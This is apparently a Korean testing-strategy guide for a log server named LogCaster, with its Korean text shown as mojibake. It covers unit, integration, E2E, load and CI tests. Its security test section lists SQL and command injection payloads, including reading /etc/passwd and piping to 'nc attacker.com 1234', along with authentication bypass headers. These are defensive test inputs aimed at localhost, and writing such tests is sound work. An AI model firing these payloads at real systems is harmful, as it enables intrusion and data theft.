# 09. í…ŒìŠ¤íŒ… ì „ëµ

## ğŸ¯ ëª©í‘œ
LogCasterì˜ í’ˆì§ˆì„ ë³´ì¥í•˜ê¸° ìœ„í•œ í¬ê´„ì ì¸ í…ŒìŠ¤íŠ¸ ì „ëµê³¼ ìë™í™”ëœ í…ŒìŠ¤íŠ¸ íŒŒì´í”„ë¼ì¸ì„ êµ¬ì¶•í•©ë‹ˆë‹¤.

## ğŸ“‹ Prerequisites
- í…ŒìŠ¤íŠ¸ í”„ë ˆì„ì›Œí¬ (pytest, gtest, CTest)
- CI/CD í™˜ê²½
- ë¶€í•˜ í…ŒìŠ¤íŠ¸ ë„êµ¬ (JMeter, Locust)
- ì½”ë“œ ì»¤ë²„ë¦¬ì§€ ë„êµ¬

---

## 1. í…ŒìŠ¤íŠ¸ í”¼ë¼ë¯¸ë“œ

### 1.1 í…ŒìŠ¤íŠ¸ ë ˆë²¨ êµ¬ì„±

```yaml
# test-pyramid.yaml
test_levels:
  unit_tests:
    percentage: 70%
    execution_time: < 1 minute
    frequency: on_every_commit
    
  integration_tests:
    percentage: 20%
    execution_time: < 5 minutes
    frequency: on_merge_request
    
  e2e_tests:
    percentage: 10%
    execution_time: < 15 minutes
    frequency: before_deployment
```

---

## 2. ë‹¨ìœ„ í…ŒìŠ¤íŠ¸

### 2.1 C ë‹¨ìœ„ í…ŒìŠ¤íŠ¸ (Unity Framework)

```c
// test_log_buffer.c
#include "unity.h"
#include "log_buffer.h"

void setUp(void) {
    // ê° í…ŒìŠ¤íŠ¸ ì „ ì‹¤í–‰
}

void tearDown(void) {
    // ê° í…ŒìŠ¤íŠ¸ í›„ ì‹¤í–‰
}

void test_buffer_initialization(void) {
    circular_buffer_t* buffer = create_buffer(100);
    
    TEST_ASSERT_NOT_NULL(buffer);
    TEST_ASSERT_EQUAL(100, buffer->capacity);
    TEST_ASSERT_EQUAL(0, buffer->count);
    TEST_ASSERT_EQUAL(0, buffer->head);
    TEST_ASSERT_EQUAL(0, buffer->tail);
    
    destroy_buffer(buffer);
}

void test_add_single_log(void) {
    circular_buffer_t* buffer = create_buffer(10);
    
    int result = add_log(buffer, "Test log message");
    
    TEST_ASSERT_EQUAL(0, result);
    TEST_ASSERT_EQUAL(1, buffer->count);
    TEST_ASSERT_EQUAL_STRING("Test log message", 
                             buffer->entries[0].message);
    
    destroy_buffer(buffer);
}

void test_buffer_overflow(void) {
    circular_buffer_t* buffer = create_buffer(2);
    
    add_log(buffer, "Log 1");
    add_log(buffer, "Log 2");
    add_log(buffer, "Log 3");  // Should overwrite "Log 1"
    
    TEST_ASSERT_EQUAL(2, buffer->count);
    TEST_ASSERT_EQUAL_STRING("Log 2", buffer->entries[0].message);
    TEST_ASSERT_EQUAL_STRING("Log 3", buffer->entries[1].message);
    
    destroy_buffer(buffer);
}

void test_concurrent_access(void) {
    circular_buffer_t* buffer = create_buffer(1000);
    pthread_t threads[10];
    
    // 10ê°œ ìŠ¤ë ˆë“œì—ì„œ ë™ì‹œì— ë¡œê·¸ ì¶”ê°€
    for (int i = 0; i < 10; i++) {
        pthread_create(&threads[i], NULL, add_logs_worker, buffer);
    }
    
    for (int i = 0; i < 10; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // ë°ì´í„° ë¬´ê²°ì„± ê²€ì¦
    TEST_ASSERT_EQUAL(1000, buffer->count);
    
    destroy_buffer(buffer);
}

int main(void) {
    UNITY_BEGIN();
    
    RUN_TEST(test_buffer_initialization);
    RUN_TEST(test_add_single_log);
    RUN_TEST(test_buffer_overflow);
    RUN_TEST(test_concurrent_access);
    
    return UNITY_END();
}
```

### 2.2 C++ ë‹¨ìœ„ í…ŒìŠ¤íŠ¸ (Google Test)

```cpp
// test_LogBuffer.cpp
#include <gtest/gtest.h>
#include "LogBuffer.h"

class LogBufferTest : public ::testing::Test {
protected:
    void SetUp() override {
        buffer = std::make_unique<LogBuffer>(100);
    }
    
    void TearDown() override {
        buffer.reset();
    }
    
    std::unique_ptr<LogBuffer> buffer;
};

TEST_F(LogBufferTest, Initialization) {
    EXPECT_EQ(buffer->getCapacity(), 100);
    EXPECT_EQ(buffer->getSize(), 0);
    EXPECT_TRUE(buffer->isEmpty());
}

TEST_F(LogBufferTest, AddSingleLog) {
    buffer->addLog("Test log message");
    
    EXPECT_EQ(buffer->getSize(), 1);
    EXPECT_FALSE(buffer->isEmpty());
    
    auto logs = buffer->getRecentLogs(1);
    ASSERT_EQ(logs.size(), 1);
    EXPECT_EQ(logs[0].message, "Test log message");
}

TEST_F(LogBufferTest, BufferOverflow) {
    auto smallBuffer = LogBuffer(2);
    
    smallBuffer.addLog("Log 1");
    smallBuffer.addLog("Log 2");
    smallBuffer.addLog("Log 3");
    
    auto logs = smallBuffer.getAllLogs();
    ASSERT_EQ(logs.size(), 2);
    EXPECT_EQ(logs[0].message, "Log 2");
    EXPECT_EQ(logs[1].message, "Log 3");
}

TEST_F(LogBufferTest, ConcurrentAccess) {
    const int numThreads = 10;
    const int logsPerThread = 100;
    std::vector<std::thread> threads;
    
    for (int i = 0; i < numThreads; i++) {
        threads.emplace_back([this, i, logsPerThread]() {
            for (int j = 0; j < logsPerThread; j++) {
                buffer->addLog("Thread " + std::to_string(i) + 
                              " Log " + std::to_string(j));
            }
        });
    }
    
    for (auto& t : threads) {
        t.join();
    }
    
    EXPECT_EQ(buffer->getSize(), 100);  // Buffer capacity
}

TEST_F(LogBufferTest, QueryPerformance) {
    // ì„±ëŠ¥ í…ŒìŠ¤íŠ¸
    auto start = std::chrono::high_resolution_clock::now();
    
    for (int i = 0; i < 10000; i++) {
        buffer->addLog("Log " + std::to_string(i));
    }
    
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    
    EXPECT_LT(duration.count(), 100);  // 100ms ì´ë‚´
}
```

---

## 3. í†µí•© í…ŒìŠ¤íŠ¸

### 3.1 Python í†µí•© í…ŒìŠ¤íŠ¸

```python
# test_integration.py
import pytest
import socket
import time
import subprocess
import psutil

class TestLogCasterIntegration:
    
    @classmethod
    def setup_class(cls):
        """í…ŒìŠ¤íŠ¸ í´ë˜ìŠ¤ ì‹œì‘ ì‹œ ì„œë²„ ì‹¤í–‰"""
        cls.server_process = subprocess.Popen(
            ['./logcaster-c', '-P'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)  # ì„œë²„ ì‹œì‘ ëŒ€ê¸°
    
    @classmethod
    def teardown_class(cls):
        """í…ŒìŠ¤íŠ¸ í´ë˜ìŠ¤ ì¢…ë£Œ ì‹œ ì„œë²„ ì¤‘ì§€"""
        cls.server_process.terminate()
        cls.server_process.wait()
    
    def test_server_is_running(self):
        """ì„œë²„ ì‹¤í–‰ í™•ì¸"""
        assert self.server_process.poll() is None
        
        # í¬íŠ¸ í™•ì¸
        connections = psutil.net_connections()
        ports = [conn.laddr.port for conn in connections if conn.status == 'LISTEN']
        assert 9999 in ports
        assert 9998 in ports
    
    def test_send_and_query_log(self):
        """ë¡œê·¸ ì „ì†¡ ë° ì¡°íšŒ"""
        # ë¡œê·¸ ì „ì†¡
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9999))
            s.send(b'Test integration log\n')
            response = s.recv(1024)
            assert response == b'OK\n'
        
        time.sleep(0.5)
        
        # ë¡œê·¸ ì¡°íšŒ
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9998))
            s.send(b'SEARCH integration\n')
            response = s.recv(4096).decode()
            assert 'Test integration log' in response
    
    def test_concurrent_connections(self):
        """ë™ì‹œ ì—°ê²° í…ŒìŠ¤íŠ¸"""
        import threading
        
        successful_connections = []
        
        def connect_and_send(thread_id):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('localhost', 9999))
                    s.send(f'Thread {thread_id} log\n'.encode())
                    response = s.recv(1024)
                    if response == b'OK\n':
                        successful_connections.append(thread_id)
            except Exception as e:
                print(f"Thread {thread_id} failed: {e}")
        
        threads = []
        for i in range(100):
            t = threading.Thread(target=connect_and_send, args=(i,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        assert len(successful_connections) >= 95  # 95% ì„±ê³µë¥ 
    
    def test_persistence(self):
        """ì˜ì†ì„± í…ŒìŠ¤íŠ¸"""
        # ë¡œê·¸ ì „ì†¡
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9999))
            s.send(b'Persistence test log\n')
        
        # ì„œë²„ ì¬ì‹œì‘
        self.server_process.terminate()
        self.server_process.wait()
        
        self.server_process = subprocess.Popen(
            ['./logcaster-c', '-P'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        time.sleep(2)
        
        # ë¡œê·¸ í™•ì¸
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9998))
            s.send(b'SEARCH persistence\n')
            response = s.recv(4096).decode()
            assert 'Persistence test log' in response
```

---

## 4. End-to-End í…ŒìŠ¤íŠ¸

### 4.1 E2E í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤

```python
# test_e2e.py
import pytest
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class TestLogCasterE2E:
    
    @classmethod
    def setup_class(cls):
        """ë¸Œë¼ìš°ì € ë“œë¼ì´ë²„ ì„¤ì •"""
        cls.driver = webdriver.Chrome()
        cls.wait = WebDriverWait(cls.driver, 10)
        cls.base_url = "http://localhost:8080"
    
    @classmethod
    def teardown_class(cls):
        """ë¸Œë¼ìš°ì € ì¢…ë£Œ"""
        cls.driver.quit()
    
    def test_complete_user_journey(self):
        """ì™„ì „í•œ ì‚¬ìš©ì ì‹œë‚˜ë¦¬ì˜¤"""
        # 1. ë¡œê·¸ì¸
        self.driver.get(f"{self.base_url}/login")
        self.driver.find_element(By.ID, "username").send_keys("admin")
        self.driver.find_element(By.ID, "password").send_keys("password")
        self.driver.find_element(By.ID, "login-btn").click()
        
        # 2. ëŒ€ì‹œë³´ë“œ í™•ì¸
        self.wait.until(EC.presence_of_element_located((By.ID, "dashboard")))
        
        # 3. ë¡œê·¸ ì „ì†¡
        self.driver.find_element(By.ID, "send-log-btn").click()
        log_input = self.driver.find_element(By.ID, "log-message")
        log_input.send_keys("E2E test log message")
        self.driver.find_element(By.ID, "submit-log").click()
        
        # 4. ë¡œê·¸ ê²€ìƒ‰
        search_input = self.driver.find_element(By.ID, "search-logs")
        search_input.send_keys("E2E test")
        self.driver.find_element(By.ID, "search-btn").click()
        
        # 5. ê²°ê³¼ í™•ì¸
        results = self.wait.until(
            EC.presence_of_element_located((By.CLASS_NAME, "log-results"))
        )
        assert "E2E test log message" in results.text
        
        # 6. ë¡œê·¸ í•„í„°ë§
        self.driver.find_element(By.ID, "filter-error").click()
        filtered_results = self.driver.find_elements(By.CLASS_NAME, "log-entry")
        for result in filtered_results:
            assert "ERROR" in result.text
```

---

## 5. ì„±ëŠ¥ í…ŒìŠ¤íŠ¸

### 5.1 ë¶€í•˜ í…ŒìŠ¤íŠ¸ (Locust)

```python
# locustfile.py
from locust import HttpUser, task, between
import random
import string

class LogCasterUser(HttpUser):
    wait_time = between(1, 3)
    
    def on_start(self):
        """ì‚¬ìš©ì ì„¸ì…˜ ì‹œì‘"""
        self.client.verify = False
        self.log_messages = [
            "INFO: User logged in",
            "DEBUG: Processing request",
            "ERROR: Connection timeout",
            "WARN: High memory usage",
            "INFO: Transaction completed"
        ]
    
    @task(3)
    def send_log(self):
        """ë¡œê·¸ ì „ì†¡"""
        message = random.choice(self.log_messages)
        response = self.client.post(
            "/logs",
            json={"message": message, "level": message.split(":")[0]},
            catch_response=True
        )
        
        if response.status_code == 200:
            response.success()
        else:
            response.failure(f"Failed with {response.status_code}")
    
    @task(2)
    def query_logs(self):
        """ë¡œê·¸ ì¡°íšŒ"""
        query_types = ["COUNT", "RECENT 10", "SEARCH error", "FILTER ERROR"]
        query = random.choice(query_types)
        
        with self.client.get(
            f"/query?q={query}",
            catch_response=True
        ) as response:
            if response.elapsed.total_seconds() > 2:
                response.failure("Query took too long")
            elif response.status_code == 200:
                response.success()
    
    @task(1)
    def health_check(self):
        """í—¬ìŠ¤ì²´í¬"""
        self.client.get("/health")

# ì‹¤í–‰: locust -f locustfile.py --host=http://localhost:9999
```

### 5.2 ìŠ¤íŠ¸ë ˆìŠ¤ í…ŒìŠ¤íŠ¸

```bash
#!/bin/bash
# stress-test.sh

echo "ğŸƒ ìŠ¤íŠ¸ë ˆìŠ¤ í…ŒìŠ¤íŠ¸ ì‹œì‘..."

# JMeter í…ŒìŠ¤íŠ¸ ì‹¤í–‰
jmeter -n -t logcaster-stress-test.jmx \
    -l results.jtl \
    -e -o report \
    -Jusers=1000 \
    -Jrampup=60 \
    -Jduration=300

# Apache Bench í…ŒìŠ¤íŠ¸
ab -n 100000 -c 1000 -k \
    -H "Content-Type: text/plain" \
    http://localhost:9999/

# ë©”ëª¨ë¦¬ ëˆ„ìˆ˜ í…ŒìŠ¤íŠ¸
valgrind --leak-check=full \
    --show-leak-kinds=all \
    --track-origins=yes \
    --log-file=valgrind.log \
    ./logcaster-c &

PID=$!
sleep 300
kill $PID

# CPU í”„ë¡œíŒŒì¼ë§
perf record -g -p $(pgrep logcaster) -- sleep 60
perf report > perf-report.txt

echo "âœ… ìŠ¤íŠ¸ë ˆìŠ¤ í…ŒìŠ¤íŠ¸ ì™„ë£Œ"
```

---

## 6. ë³´ì•ˆ í…ŒìŠ¤íŠ¸

### 6.1 ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸

```python
# test_security.py
import pytest
import socket
import requests

class TestSecurity:
    
    def test_sql_injection(self):
        """SQL ì¸ì ì…˜ í…ŒìŠ¤íŠ¸"""
        payloads = [
            "'; DROP TABLE logs; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--"
        ]
        
        for payload in payloads:
            response = requests.get(
                f"http://localhost:9998/query",
                params={"search": payload}
            )
            # ì—ëŸ¬ê°€ ì•„ë‹Œ ì •ìƒ ì‘ë‹µ í™•ì¸
            assert response.status_code in [200, 400]
            assert "syntax error" not in response.text.lower()
            assert "sql" not in response.text.lower()
    
    def test_buffer_overflow(self):
        """ë²„í¼ ì˜¤ë²„í”Œë¡œìš° í…ŒìŠ¤íŠ¸"""
        large_payload = "A" * 100000
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('localhost', 9999))
            s.send(large_payload.encode())
            response = s.recv(1024)
            # ì„œë²„ê°€ í¬ë˜ì‹œí•˜ì§€ ì•Šê³  ì‘ë‹µ
            assert response is not None
    
    def test_command_injection(self):
        """ëª…ë ¹ ì¸ì ì…˜ í…ŒìŠ¤íŠ¸"""
        payloads = [
            "test; ls -la",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "$(whoami)"
        ]
        
        for payload in payloads:
            response = requests.post(
                "http://localhost:9999/logs",
                data=payload
            )
            assert response.status_code in [200, 400]
    
    def test_authentication_bypass(self):
        """ì¸ì¦ ìš°íšŒ ì‹œë„"""
        headers_list = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "localhost"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},
            {"Cookie": "session=admin"}
        ]
        
        for headers in headers_list:
            response = requests.get(
                "http://localhost:9998/admin",
                headers=headers
            )
            assert response.status_code == 401
```

---

## 7. í…ŒìŠ¤íŠ¸ ìë™í™”

### 7.1 CI/CD í…ŒìŠ¤íŠ¸ íŒŒì´í”„ë¼ì¸

```yaml
# .github/workflows/test.yml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        compiler: [gcc, clang]
    steps:
    - uses: actions/checkout@v3
    
    - name: Install dependencies
      run: |
        sudo apt-get update
        sudo apt-get install -y cmake valgrind lcov
    
    - name: Build
      run: |
        mkdir build && cd build
        cmake -DCMAKE_BUILD_TYPE=Debug -DENABLE_COVERAGE=ON ..
        make
    
    - name: Run unit tests
      run: |
        cd build
        ctest --output-on-failure
    
    - name: Generate coverage report
      run: |
        lcov --capture --directory . --output-file coverage.info
        lcov --remove coverage.info '/usr/*' --output-file coverage.info
        lcov --list coverage.info
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.info
        fail_ci_if_error: true

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        pip install pytest pytest-cov pytest-timeout
    
    - name: Run integration tests
      run: |
        pytest tests/integration --timeout=300 --cov=.
    
    - name: Upload test results
      uses: actions/upload-artifact@v3
      with:
        name: test-results
        path: test-results.xml

  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
    - uses: actions/checkout@v3
    
    - name: Run performance tests
      run: |
        docker run -d --name logcaster -p 9999:9999 logcaster:test
        sleep 5
        
        # ë¶€í•˜ í…ŒìŠ¤íŠ¸
        docker run --rm -v $PWD:/mnt/locust \
          locustio/locust -f /mnt/locust/locustfile.py \
          --headless -u 100 -r 10 -t 60s \
          --host http://logcaster:9999
    
    - name: Analyze results
      run: |
        python scripts/analyze_performance.py results.json
        
        # ì„±ëŠ¥ ê¸°ì¤€ ì²´í¬
        if [ $(jq '.stats[0].avg_response_time' results.json) -gt 100 ]; then
          echo "Performance regression detected!"
          exit 1
        fi

  security-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    steps:
    - uses: actions/checkout@v3
    
    - name: Run security tests
      run: |
        # SAST
        docker run --rm -v $PWD:/src \
          returntocorp/semgrep --config=auto
        
        # ì˜ì¡´ì„± ì²´í¬
        docker run --rm -v $PWD:/src \
          owasp/dependency-check --scan /src
        
        # ì»¨í…Œì´ë„ˆ ìŠ¤ìº”
        trivy image logcaster:test
```

---

## 8. í…ŒìŠ¤íŠ¸ ë¦¬í¬íŠ¸

### 8.1 í…ŒìŠ¤íŠ¸ ë¦¬í¬íŠ¸ ìƒì„±

```bash
#!/bin/bash
# generate-test-report.sh

echo "ğŸ“Š í…ŒìŠ¤íŠ¸ ë¦¬í¬íŠ¸ ìƒì„±..."

# HTML ë¦¬í¬íŠ¸ ìƒì„±
cat > test-report.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>LogCaster Test Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .summary { background: #f0f0f0; padding: 15px; border-radius: 5px; }
        .passed { color: green; }
        .failed { color: red; }
        .skipped { color: orange; }
        table { width: 100%; border-collapse: collapse; margin: 20px 0; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background: #4CAF50; color: white; }
    </style>
</head>
<body>
    <h1>LogCaster Test Report</h1>
    <div class="summary">
        <h2>Summary</h2>
        <p>Date: $(date)</p>
        <p>Total Tests: $(grep -c "^test_" test-results.xml)</p>
        <p class="passed">Passed: $(grep -c "passed" test-results.xml)</p>
        <p class="failed">Failed: $(grep -c "failed" test-results.xml)</p>
        <p class="skipped">Skipped: $(grep -c "skipped" test-results.xml)</p>
        <p>Coverage: $(grep "TOTAL" coverage.txt | awk '{print $4}')</p>
    </div>
    
    <h2>Test Results</h2>
    <table>
        <tr>
            <th>Test Suite</th>
            <th>Tests</th>
            <th>Passed</th>
            <th>Failed</th>
            <th>Time (s)</th>
        </tr>
        $(python3 scripts/parse_test_results.py)
    </table>
    
    <h2>Performance Metrics</h2>
    <table>
        <tr>
            <th>Metric</th>
            <th>Value</th>
            <th>Threshold</th>
            <th>Status</th>
        </tr>
        <tr>
            <td>Average Response Time</td>
            <td>$(jq '.avg_response_time' perf.json)ms</td>
            <td>100ms</td>
            <td class="$([ $(jq '.avg_response_time' perf.json) -lt 100 ] && echo "passed" || echo "failed")">
                $([ $(jq '.avg_response_time' perf.json) -lt 100 ] && echo "âœ“" || echo "âœ—")
            </td>
        </tr>
        <tr>
            <td>Throughput</td>
            <td>$(jq '.throughput' perf.json) req/s</td>
            <td>1000 req/s</td>
            <td class="$([ $(jq '.throughput' perf.json) -gt 1000 ] && echo "passed" || echo "failed")">
                $([ $(jq '.throughput' perf.json) -gt 1000 ] && echo "âœ“" || echo "âœ—")
            </td>
        </tr>
    </table>
</body>
</html>
EOF

echo "âœ… í…ŒìŠ¤íŠ¸ ë¦¬í¬íŠ¸ ìƒì„± ì™„ë£Œ: test-report.html"
```

---

## âœ… ì²´í¬ë¦¬ìŠ¤íŠ¸

### í•„ìˆ˜ í™•ì¸ì‚¬í•­
- [ ] ë‹¨ìœ„ í…ŒìŠ¤íŠ¸ ì»¤ë²„ë¦¬ì§€ > 80%
- [ ] í†µí•© í…ŒìŠ¤íŠ¸ êµ¬í˜„
- [ ] E2E í…ŒìŠ¤íŠ¸ ì‹œë‚˜ë¦¬ì˜¤
- [ ] ì„±ëŠ¥ í…ŒìŠ¤íŠ¸ ê¸°ì¤€ ì„¤ì •
- [ ] ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ì‹¤í–‰
- [ ] CI/CD í†µí•©

### ê¶Œì¥ì‚¬í•­
- [ ] ë³€ì´ í…ŒìŠ¤íŠ¸
- [ ] ì¹´ì˜¤ìŠ¤ ì—”ì§€ë‹ˆì–´ë§
- [ ] A/B í…ŒìŠ¤íŠ¸
- [ ] ë¶€í•˜ í…ŒìŠ¤íŠ¸ ìë™í™”
- [ ] í…ŒìŠ¤íŠ¸ ë¦¬í¬íŠ¸ ìë™ ìƒì„±
- [ ] í…ŒìŠ¤íŠ¸ ë°ì´í„° ê´€ë¦¬

---

## ğŸ¯ ë‹¤ìŒ ë‹¨ê³„
â†’ [10_deployment_steps.md](10_deployment_steps.md) - ì‹¤ì œ ë°°í¬ ë‹¨ê³„